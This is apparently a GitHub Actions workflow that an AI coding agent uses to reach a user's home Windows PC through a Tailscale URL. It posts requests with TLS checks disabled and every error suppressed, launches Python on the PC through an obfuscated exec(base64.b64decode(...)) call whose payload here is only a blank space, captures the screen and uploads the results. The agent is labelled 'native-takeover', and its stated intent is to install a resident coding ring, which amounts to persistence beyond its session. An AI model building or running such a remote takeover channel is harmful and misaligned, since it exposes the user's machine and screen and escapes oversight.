name: ARCHIE hotwire probe
on:
  push:
    paths: ['.github/workflows/archie-hotwire-probe.yml']
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Native PC-first takeover
        shell: bash
        run: |
          set -euo pipefail
          root='https://desktop-6fn9b4m.tail1bf489.ts.net/archie-phone/v1/action'
          mkdir -p /tmp/archie-hotwire
          cat > /tmp/archie-hotwire/start.json <<'EOF'
          {"action":"controller.action","spec":{"action":"native_terminal","op":"start","argv":["C:\\Users\\AwesomeKai\\AppData\\Local\\Programs\\Python\\Python312\\python.exe","-c","import base64;exec(base64.b64decode(' '))"],"agent":"gpt56sol-native-takeover","role":"execute","intent":"adopt native PC-first coding goal, discover bounded local state, install and self-test one resident project coding ring"}}
          EOF
          curl -k -L --max-time 35 -sS -H 'content-type: application/json' --data-binary @/tmp/archie-hotwire/start.json "$root" > /tmp/archie-hotwire/start-result.json || true
          sleep 18
          curl -k -L --max-time 15 -sS -H 'content-type: application/json' --data '{"action":"controller.read"}' "$root" > /tmp/archie-hotwire/state.json || true
          curl -k -L --max-time 15 -sS -H 'content-type: application/json' --data '{"action":"controller.action","spec":{"action":"inspect","limit":260,"agent":"gpt56sol-native-takeover","role":"measure","intent":"verify native ring adoption and local coding state"}}' "$root" > /tmp/archie-hotwire/inspect.json || true
          curl -k -L --max-time 15 -sS -H 'content-type: application/json' --data '{"action":"controller.action","spec":{"action":"sense","sense":"region","image":true,"agent":"gpt56sol-native-takeover","role":"measure","intent":"verify current PC surface after native takeover"}}' "$root" > /tmp/archie-hotwire/shot.json || true
      - uses: actions/upload-artifact@v4
        with:
          name: gpt56-native-takeover
          path: /tmp/archie-hotwire
          retention-days: 1
